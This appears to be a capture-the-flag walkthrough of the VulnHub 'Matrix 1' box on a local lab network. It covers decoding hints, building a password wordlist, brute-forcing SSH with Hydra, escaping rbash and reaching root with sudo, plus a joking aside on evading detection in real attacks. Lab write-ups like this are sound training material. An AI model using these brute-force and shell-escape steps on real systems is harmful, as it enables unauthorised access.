[Link to VulnHub](https://www.vulnhub.com/entry/matrix-1,259/)

Install the box, start it... Ok, then what...

Same first steps as for any box : nmap !

~~~
$ nmap -sn 192.168.56.0/24 
Nmap scan report for 192.168.56.104
Host is up (0.0012s latency).
~~~

So open the IP addres is a browser.  Nothing stands out. Follow the white rabbit.. ok.  Click on the rabbit : nothing. Right click on the rabbit.

~~~
Name of the image : p0rt_[REMOVED]
~~~

Ok then, add the port to the URL

~~~
http://192.168.56.104:[REMOVED]
~~~

Ok, same kind of page as before. But then, there is the ```Cypher``` word here. Soo.. check source, something interresting

~~~
<!--service -->
    <div class="service">
        <!--p class="service__text">ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=</p-->
    </div>
<!-- End / service -->
							
~~~

That's Base64 encoding right here. What's giving it away is the presence a "=" sign at the end. Base64 is one of the most used type of encoding on the web, especially for obfuscation. You can use an online tool or, if you use kali, you can use [hURL](https://www.kali.org/tools/hurl/)

~~~
hURL -b "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg="
Original string       :: ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=
base64 DEcoded string :: echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
~~~

That does not tell us anything really. Let's popup gobuster in order to scan dirs.

~~~
gobuster dir -u http://192.168.56.104:31337 -w ~/Desktop/wordlist.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.104:31337
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/user/Desktop/wordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 0] [--> /assets/]
Progress: 1828 / 1829 (99.95%)
===============================================================
Finished
===============================================================

~~~

No dice... Hum, let's try something : There was a > Cypher.matrix at the end of the quote...
~~~
http://192.168.56.104:31337/Cypher.matrix
+++++ ++++[ ->+++ +++++ +<]>+ +++++ ++.<+ +++[- >++++ <]>++ ++++. +++++
+.<++ +++++ ++[-> ----- ----< ]>--- -.<++ +++++ +[->+ +++++ ++<]> +++.-
-.<++ +[->+ ++<]> ++++. <++++ ++++[ ->--- ----- <]>-- ----- ----- --.<+
+++++ ++[-> +++++ +++<] >++++ +.+++ +++++ +.+++ +++.< +++[- >---< ]>---
---.< +++[- >+++< ]>+++ +.<++ +++++ ++[-> ----- ----< ]>-.< +++++ +++[-
>++++ ++++< ]>+++ +++++ +.+++ ++.++ ++++. ----- .<+++ +++++ [->-- -----
-<]>- ----- ----- ----. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ +.<++
+[->- --<]> ---.< ++++[ ->+++ +<]>+ ++.-- .---- ----- .<+++ [->++ +<]>+
+++++ .<+++ +++++ +[->- ----- ---<] >---- ---.< +++++ +++[- >++++ ++++<
]>+.< ++++[ ->+++ +<]>+ +.<++ +++++ ++[-> ----- ----< ]>--. <++++ ++++[
->+++ +++++ <]>++ +++++ .<+++ [->++ +<]>+ ++++. <++++ [->-- --<]> .<+++
[->++ +<]>+ ++++. +.<++ +++++ +[->- ----- --<]> ----- ---.< +++[- >---<
]>--- .<+++ +++++ +[->+ +++++ +++<] >++++ ++.<+ ++[-> ---<] >---- -.<++
+[->+ ++<]> ++.<+ ++[-> ---<] >---. <++++ ++++[ ->--- ----- <]>-- -----
-.<++ +++++ +[->+ +++++ ++<]> +++++ +++++ +++++ +.<++ +[->- --<]> -----
-.<++ ++[-> ++++< ]>++. .++++ .---- ----. +++.< +++[- >---< ]>--- --.<+
+++++ ++[-> ----- ---<] >---- .<+++ +++++ [->++ +++++ +<]>+ +++++ +++++
.<+++ ++++[ ->--- ----< ]>--- ----- -.<++ +++++ [->++ +++++ <]>++ +++++
+++.. <++++ +++[- >---- ---<] >---- ----- --.<+ +++++ ++[-> +++++ +++<]
>++.< +++++ [->-- ---<] >-..< +++++ +++[- >---- ----< ]>--- ----- ---.-
--.<+ +++++ ++[-> +++++ +++<] >++++ .<+++ ++[-> +++++ <]>++ +++++ +.+++
++.<+ ++[-> ---<] >---- --.<+ +++++ [->-- ----< ]>--- ----. <++++ +[->-
----< ]>-.< +++++ [->++ +++<] >++++ ++++. <++++ +[->+ ++++< ]>+++ +++++
+.<++ ++[-> ++++< ]>+.+ .<+++ +[->- ---<] >---- .<+++ [->++ +<]>+ +..<+
++[-> +++<] >++++ .<+++ +++++ [->-- ----- -<]>- ----- ----- --.<+ ++[->
---<] >---. <++++ ++[-> +++++ +<]>+ ++++. <++++ ++[-> ----- -<]>- ----.
<++++ ++++[ ->+++ +++++ <]>++ ++++. +++++ ++++. +++.< +++[- >---< ]>--.
--.<+ ++[-> +++<] >++++ ++.<+ +++++ +++[- >---- ----- <]>-- -.<++ +++++
+[->+ +++++ ++<]> +++++ +++++ ++.<+ ++[-> ---<] >--.< ++++[ ->+++ +<]>+
+.+.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ +++[- >++++ +++++ <]>++
+.+++ .---- ----. <++++ ++++[ ->--- ----- <]>-- ----- ----- ---.< +++++
+++[- >++++ ++++< ]>+++ .++++ +.--- ----. <++++ [->++ ++<]> +.<++ ++[->
----< ]>-.+ +.<++ ++[-> ++++< ]>+.< +++[- >---< ]>--- ---.< +++[- >+++<
]>+++ +.+.< +++++ ++++[ ->--- ----- -<]>- -.<++ +++++ ++[-> +++++ ++++<
]>++. ----. <++++ ++++[ ->--- ----- <]>-- ----- ----- ---.< +++++ +[->+
+++++ <]>++ +++.< +++++ +[->- ----- <]>-- ---.< +++++ +++[- >++++ ++++<
]>+++ +++++ .---- ---.< ++++[ ->+++ +<]>+ ++++. <++++ [->-- --<]> -.<++
+++++ +[->- ----- --<]> ----- .<+++ +++++ +[->+ +++++ +++<] >+.<+ ++[->
---<] >---- .<+++ [->++ +<]>+ +.--- -.<++ +[->- --<]> --.++ .++.- .<+++
+++++ [->-- ----- -<]>- ---.< +++++ ++++[ ->+++ +++++ +<]>+ +++++ .<+++
[->-- -<]>- ----. <+++[ ->+++ <]>++ .<+++ [->-- -<]>- --.<+ +++++ ++[->
----- ---<] >---- ----. <++++ +++[- >++++ +++<] >++++ +++.. <++++ +++[-
>---- ---<] >---- ---.< +++++ ++++[ ->+++ +++++ +<]>+ ++.-- .++++ +++.<
+++++ ++++[ ->--- ----- -<]>- ----- --.<+ +++++ +++[- >++++ +++++ <]>++
+++++ +.<++ +[->- --<]> -.+++ +++.- --.<+ +++++ +++[- >---- ----- <]>-.
<++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ .++++ +++++ .<+++ +[->- ---<]
>--.+ +++++ ++.<+ +++++ ++[-> ----- ---<] >---- ----- --.<+ +++++ ++[->
+++++ +++<] >+.<+ ++[-> +++<] >++++ .<+++ [->-- -<]>- .<+++ +++++ [->--
----- -<]>- ---.< +++++ +++[- >++++ ++++< ]>+++ +++.+ ++.++ +++.< +++[-
>---< ]>-.< +++++ +++[- >---- ----< ]>--- -.<++ +++++ +[->+ +++++ ++<]>
+++.< +++[- >+++< ]>+++ .+++. .<+++ [->-- -<]>- ---.- -.<++ ++[-> ++++<
]>+.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ +++[- >++++ +++++ <]>++
.+.-- .---- ----- .++++ +.--- ----. <++++ ++++[ ->--- ----- <]>-- -----
.<+++ +++++ [->++ +++++ +<]>+ +++++ +++++ ++++. ----- ----. <++++ ++++[
->--- ----- <]>-- ----. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ ++++.
<+++[ ->--- <]>-- ----. <++++ [->++ ++<]> ++..+ +++.- ----- --.++ +.<++
+[->- --<]> ----- .<+++ ++++[ ->--- ----< ]>--- --.<+ ++++[ ->--- --<]>
----- ---.- --.<
~~~


Ahhh! Good ol' [brainf*ck](https://en.wikipedia.org/wiki/Brainfuck), still going strong! I learned about this a couple years back and frankly, first time you see this you wonder if your CPU and GPU are alright. 

This, you'll need a decoder, unless you really want to lose a couple year's wort of your life trying by hand, be my guest...

~~~
You can enter into matrix as guest, with password k1ll0rXX
Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password
~~~

The last 2 chars are missing, let's create a script that will output all the possible passwords in a txt file, so we can use it with [Hydra](https://www.kali.org/tools/hydra/) later.

~~~
//pswd.py
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
with open("pswd.txt", "w") as file:
    for a in chars:
        for b in chars:
            file.write("k1ll0r"+a+b+"\n")
            


python pswd.py
~~~

We now have all possible password ending with any two of the characters in the ```chars``` string. Let's load this file as a list of passwords to try with Hydra.
In a real life, live environment scenario, you would put on your shades and wear your darkest hoodie, run this command at 2am from a server in a different country, paid with bitcoins while tunnelling with tor, you would reduce the number of attempt to 1, or put a delay between each attempt ( -c ) not to raise suspicions, but this is our own local env... Light up the Christmas tree baby!

~~~
hydra -l guest -P pswd.txt -t 4 ssh://192.168.56.104
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-27 14:14:36
[DATA] max 4 tasks per 1 server, overall 4 tasks, 3844 login tries (l:1/p:3844), ~961 tries per task
[DATA] attacking ssh://192.168.56.104:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 3800 to do in 01:27h, 4 active
~~~

Let's get a cuppa and come back later...

~~~
[22][ssh] host: 192.168.56.104   login: guest   password: [REMOVED]
~~~

Let's try this

~~~
$ ssh guest@192.168.56.104
The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
ED25519 key fingerprint is SHA256:7J8BisyeEyPLY56CVLgtGcEa+Kp665WwwL1HB3GtIpQ.
Warning: Permanently added '192.168.56.104' (ED25519) to the list of known hosts.
guest@192.168.56.104's password: 
guest@porteus:~$ 
~~~

Nice, let's see where we are

~~~
guest@porteus:~$ ls
-rbash: /bin/ls: restricted: cannot specify `/' in command names
~~~

rbash dang? Let's logout and reconnect forcing Bash

~~~
$ ssh -t guest@192.168.56.104 bash
guest@192.168.56.104's password: 
guest@porteus:~$ ls
Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/  prog/
~~~

We where able to login with a normal bash, that's a good sign.  Ok let's navigate a bit... nothing interesting in /home. /tmp either.
Let's se if we can switch from ```guest``` to ```root```

~~~
guest@porteus:/$ whoami
guest
guest@porteus:/$ sudo su
Password: 
root@porteus:/#
~~~

Hey, that worked!

~~~
root@porteus:/# cd root/
root@porteus:~# ls
Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/  flag.txt
root@porteus:~# cat flag.txt 
~~~

Nice, done with this one. Let's move to Matrix2!

~~~
exit
exit
clear
~~~